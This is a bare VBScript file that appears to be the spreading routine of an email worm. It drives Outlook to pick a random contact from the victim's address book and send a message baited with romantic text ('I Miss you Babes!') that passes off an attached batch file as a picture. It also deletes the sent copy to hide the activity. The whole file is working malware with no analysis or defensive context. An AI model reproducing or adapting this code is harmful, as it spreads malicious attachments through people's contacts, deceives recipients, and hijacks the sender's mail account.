dim x                    
Set ol= CreateObject("Outlook.Application") 
Set Mail=ol.CreateItem(0) 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
x= a.AddressEntries.Count 
randomize 
counter = Int(x*Rnd+1)                                 
Mail.to= ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(counter) 
Mail.Subject= "I Miss you Babes!"
Mail.Body= "I really miss you babes, i hope u comeback to me! this picture is for you, plss see my attachment."
Mail.Attachments.Add("c:\windows\mypic.bat")      
Mail.DeleteAfterSubmit= true                    
Mail.Send        
ol.Quit 

